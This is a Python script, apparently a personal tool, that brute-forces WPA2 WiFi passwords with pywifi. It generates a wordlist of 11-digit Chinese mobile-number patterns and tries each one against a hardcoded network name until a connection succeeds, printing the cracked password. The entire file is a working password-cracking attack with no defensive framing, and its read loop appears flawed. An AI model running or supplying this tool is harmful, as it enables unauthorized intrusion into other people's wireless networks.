# -*- coding: utf-8 -*-
# @Time    : 2023/8/8

import pywifi
from pywifi import const
import time
import datetime


def generate_scre():
    areas = ['134', '135', '136', '137', '138', '139', '147', '150', '151', 152, 157, 158, 159, 178, 182, 183, 184, 187,
             188, '198', 130, 131, 132, 155, 156, 145, 175, 176, 185, 186, 166, 133, 149, 153, 173, 177, 180, 181, 189,
             199]
    with open('./numberPass.txt', 'w') as f:
        for area in areas:
            pwd3 = str(area)
            for i in range(10):
                pwd4 = pwd3 + str(i)
                for i in range(10):
                    pwd5 = pwd4 + str(i)
                    for i in range(10):
                        pwd6 = pwd5 + str(i)
                        for i in range(10):
                            pwd7 = pwd6 + str(i)
                            for i in range(10):
                                pwd8 = pwd7 + str(i)
                                for i in range(10):
                                    pwd9 = pwd8 + str(i)
                                    for i in range(10):
                                        pwd10 = pwd9 + str(i)
                                        for i in range(10):
                                            pwd11 = pwd10 + str(i)
                                    
                                            f.writelines(pwd11 + '\n')

# 测试连接，返回链接结果
def wifiConnect(pwd):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        # profile.ssid = "Xiaomi_4E8A"
        # profile.ssid = "Tenda_002D00"
        # profile.ssid = "CU_6AYp"
        profile.ssid = "CU_XFZh"
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")


def readPassword():
    print("开始破解:")
    # 密码本路径
    path = "./numberPass.txt"
    # 打开文件
    file = open(path, "r")
    while True:
        try:
            # 一行一行读取
            pad = file.readline()
            bool = wifiConnect(pad)
            
            if bool:
                print("密码已破解：", pad)
                print("WiFi已自动连接！！！")
                break
            else:
                # 跳出当前循环，进行下一次循环
                print("密码破解中....密码校对: ", pad)
        except:
            continue


if __name__ == "__main__":
    # print('生成密码中......,请等待')
    # generate_scre()
    start = datetime.datetime.now()
    print('开始破解......,请等待')
    readPassword()
    end = datetime.datetime.now()
    print("破解WIFI密码一共用了多长时间：{}".format(end - start))
